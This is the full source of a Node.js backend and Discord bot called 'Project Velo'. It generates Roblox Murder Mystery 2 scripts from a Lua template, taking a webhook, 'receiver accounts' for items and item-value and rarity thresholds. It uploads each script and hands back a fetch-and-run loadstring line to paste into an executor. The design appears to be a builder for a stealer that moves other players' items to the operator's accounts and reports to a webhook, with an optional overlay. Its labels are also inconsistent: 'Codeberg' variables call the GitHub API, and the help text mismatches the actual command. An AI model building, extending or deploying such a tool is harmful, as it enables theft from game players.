// Project Velo — Backend + Discord Bot
// Node.js 18+  |  discord.js v14  |  express  |  axios  |  dotenv

require("dotenv").config();
const express   = require("express");
const axios     = require("axios");
const fs        = require("fs");
const path      = require("path");
const { v4: uuidv4 } = require("uuid");

const {
    Client,
    GatewayIntentBits,
    REST,
    Routes,
    SlashCommandBuilder,
    EmbedBuilder,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    MessageFlags,
} = require("discord.js");

// ── env ──────────────────────────────────────────────────────────────────────
const {
    BOT_TOKEN,
    CLIENT_ID,
    CODEBERG_TOKEN,
    CODEBERG_OWNER,
    CODEBERG_REPO,
    CODEBERG_BRANCH = "main",
    PORT = 3000,
} = process.env;

if (!BOT_TOKEN || !CLIENT_ID || !CODEBERG_TOKEN || !CODEBERG_OWNER || !CODEBERG_REPO) {
    console.error("[VELO] Missing required env vars — check .env");
    process.exit(1);
}

// ── templates ────────────────────────────────────────────────────────────────
const BASE_TEMPLATE = fs.readFileSync(path.join(__dirname, "template", "base.lua"), "utf8");
const VISUAL_MODULE  = fs.readFileSync(path.join(__dirname, "modules",  "visual.lua"), "utf8");

// ── codeberg ─────────────────────────────────────────────────────────────────
const codebergApi = axios.create({
    baseURL: "https://api.github.com",
    headers: {
        Authorization: `Bearer ${CODEBERG_TOKEN}`,
        "Content-Type": "application/json",
        "X-GitHub-Api-Version": "2022-11-28",
    },
});

async function uploadToCodeberg(filename, content) {
    const encoded = Buffer.from(content, "utf8").toString("base64");
    const filepath = `scripts/${filename}`;

    // check if file already exists (need sha to overwrite)
    let sha = null;
    try {
        const existing = await codebergApi.get(
            `/repos/${CODEBERG_OWNER}/${CODEBERG_REPO}/contents/${filepath}`
        );
        sha = existing.data.sha;
    } catch (_) { /* new file */ }

    const body = {
        message: `Generate ${filename}`,
        content: encoded,
        branch: CODEBERG_BRANCH,
    };
    if (sha) body.sha = sha;

    await codebergApi.put(
        `/repos/${CODEBERG_OWNER}/${CODEBERG_REPO}/contents/${filepath}`,
        body
    );

    const rawUrl = `https://raw.githubusercontent.com/${CODEBERG_OWNER}/${CODEBERG_REPO}/${CODEBERG_BRANCH}/${filepath}`;
    return rawUrl;
}

// ── script generator ──────────────────────────────────────────────────────────
function generateScript({ webhook, targets, minValue = 0, minRarity = "Common", visual = false, receiverAccounts = [] }) {
    // build targets lua table string
    const targetList = targets
        .map(t => `        "${t.trim()}"`)
        .join(",\n");
    const targetsLua = targets.length > 0
        ? `{\n${targetList},\n    }`
        : `{}`;

    // build receiverAccounts lua table string
    const receiverList = receiverAccounts
        .map(r => `        "${r.trim()}"`)
        .join(",\n");
    const receiverAccountsLua = receiverAccounts.length > 0
        ? `{\n${receiverList},\n    }`
        : `{}`;

    let script = BASE_TEMPLATE
        .replace("{{WEBHOOK}}",            webhook)
        .replace("{{TARGETS}}",            targetsLua)
        .replace("{{RECEIVER_ACCOUNTS}}", receiverAccountsLua)
        .replace("{{MIN_VALUE}}",          String(minValue))
        .replace("{{MIN_RARITY}}",         minRarity);

    // inject visual module before the main runtime
    // if visual=false, leave {{VISUAL_CODE}} for the caller to replace (e.g. custom_lua_visual)
    if (visual) {
        script = script.replace("{{VISUAL_CODE}}", `-- Visual Module\n${VISUAL_MODULE}\n`);
    }

    return script;
}

// ── express api ───────────────────────────────────────────────────────────────
const app = express();
app.use(express.json());

// POST /generate
// body: { webhook, targets: string[], minValue?, minRarity?, visual? }
app.post("/generate", async (req, res) => {
    const { webhook, targets, minValue, minRarity, visual, receiverAccounts } = req.body;

    if (!webhook || !Array.isArray(receiverAccounts) || receiverAccounts.length === 0) {
        return res.status(400).json({ error: "webhook and receiverAccounts[] required" });
    }

    const safeTargets = Array.isArray(targets) ? targets : [];

    try {
        const script   = generateScript({ webhook, targets: safeTargets, minValue, minRarity, visual, receiverAccounts });
        const filename = `${uuidv4()}.lua`;
        const rawUrl   = await uploadToCodeberg(filename, script);
        const loadstr  = `loadstring(game:HttpGet("${rawUrl}"))()`;

        return res.json({ rawUrl, loadstring: loadstr, filename });
    } catch (err) {
        console.error("[VELO] generate error:", err.message);
        return res.status(500).json({ error: err.message });
    }
});

app.get("/health", (_, res) => res.json({ status: "ok" }));

app.listen(PORT, () => console.log(`[VELO] API listening on :${PORT}`));

// ── discord bot ───────────────────────────────────────────────────────────────
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// register slash commands
const commands = [
    new SlashCommandBuilder()
        .setName("generate-mm2")
        .setDescription("Generate a Roblox MM2 script and upload the obfuscated version")
        .addStringOption(o =>
            o.setName("receiver_accounts")
             .setDescription("Roblox usernames that receive items, comma separated (e.g. acc1,acc2)")
             .setRequired(true))
        .addStringOption(o =>
            o.setName("webhook")
             .setDescription("Your Discord webhook URL")
             .setRequired(true))

        .addIntegerOption(o =>
            o.setName("threshold")
             .setDescription("Minimum item value threshold (default 0)")
             .setRequired(false))
        .addStringOption(o =>
            o.setName("min_rarity")
             .setDescription("Minimum rarity (default Common)")
             .addChoices(
                 { name: "Common",    value: "Common" },
                 { name: "Uncommon",  value: "Uncommon" },
                 { name: "Rare",      value: "Rare" },
                 { name: "Epic",      value: "Epic" },
                 { name: "Legendary", value: "Legendary" },
                 { name: "Godly",     value: "Godly" },
             )
             .setRequired(false))
        .addStringOption(o =>
            o.setName("custom_lua_visual")
             .setDescription("Paste your own Lua visual script here (optional)")
             .setRequired(false))
        .toJSON(),

    new SlashCommandBuilder()
        .setName("help")
        .setDescription("Project Velo usage guide")
        .toJSON(),
];

client.once("clientReady", async () => {
    console.log(`[VELO] Bot logged in as ${client.user.tag}`);
    const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log("[VELO] Slash commands registered");
});

client.on("interactionCreate", async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ── /generate-mm2 ─────────────────────────────────────────────────────────
    if (interaction.commandName === "generate-mm2") {
        await interaction.deferReply({ flags: MessageFlags.Ephemeral });

        const webhook             = interaction.options.getString("webhook");
        const receiverAccountsRaw = interaction.options.getString("receiver_accounts");
        const minValue            = interaction.options.getInteger("threshold") ?? 0;
        const minRarity           = interaction.options.getString("min_rarity") ?? "Common";
        const customLuaVisual     = interaction.options.getString("custom_lua_visual") ?? null;

        // basic webhook URL validation
        if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
            return interaction.editReply({ content: "❌ Invalid webhook URL." });
        }

        const receiverAccounts = receiverAccountsRaw.split(",").map(r => r.trim()).filter(Boolean);
        if (receiverAccounts.length === 0) {
            return interaction.editReply({ content: "❌ No valid receiver accounts provided." });
        }

        // executor filter hardcoded to empty — anyone can run the script
        const targets = [];

        try {
            // inject custom visual lua if provided, otherwise strip placeholder
            const visualCode = customLuaVisual ? `-- Custom Visual\n${customLuaVisual}\n` : "";
            const script   = generateScript({ webhook, targets, minValue, minRarity, visual: false, receiverAccounts })
                .replace("{{VISUAL_CODE}}", visualCode);  // always replaces — empty string removes it cleanly
            const filename = `${uuidv4()}.lua`;
            const rawUrl   = await uploadToCodeberg(filename, script);
            const loadstr  = `loadstring(game:HttpGet("${rawUrl}"))()`;

            const embed = new EmbedBuilder()
                .setTitle("⚡ Project Velo — Script Generated")
                .setColor(0x6c5ce7)
                .addFields(
                    { name: "Receiver Accounts", value: receiverAccounts.join(", "),                        inline: false },

                    { name: "Threshold",     value: String(minValue),              inline: true  },
                    { name: "Min Rarity",    value: minRarity,                     inline: true  },
                    { name: "Custom Visual", value: customLuaVisual ? "Yes" : "No", inline: true },
                    { name: "Loadstring",    value: `\`\`\`lua\n${loadstr}\n\`\`\``, inline: false },
                )
                .setFooter({ text: "Project Velo • paste loadstring in your executor" })
                .setTimestamp();

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setLabel("Raw Script")
                    .setStyle(ButtonStyle.Link)
                    .setURL(rawUrl),
            );

            return interaction.editReply({ embeds: [embed], components: [row] });
        } catch (err) {
            console.error("[VELO] /generate-mm2 error:", err.message);
            return interaction.editReply({ content: `❌ Generation failed: ${err.message}` });
        }
    }

    // ── /help ──────────────────────────────────────────────────────────────────
    if (interaction.commandName === "help") {
        const embed = new EmbedBuilder()
            .setTitle("⚡ Project Velo — Help")
            .setColor(0x6c5ce7)
            .setDescription("Generate and deploy MM2 scripts via Discord slash commands.")
            .addFields(
                {
                    name: "/generate",
                    value: [
                        "`webhook` — your Discord webhook URL",
                        "`targets` — comma separated Roblox usernames",
                        "`min_value` — minimum item value filter (optional)",
                        "`min_rarity` — minimum rarity filter (optional)",
                        "`visual` — add in-game GUI overlay (optional)",
                    ].join("\n"),
                },
                {
                    name: "How to run",
                    value: "Copy the loadstring from the generated output and paste it into your executor.",
                },
            )
            .setFooter({ text: "Project Velo" });

        return interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
    }
});

client.login(BOT_TOKEN);
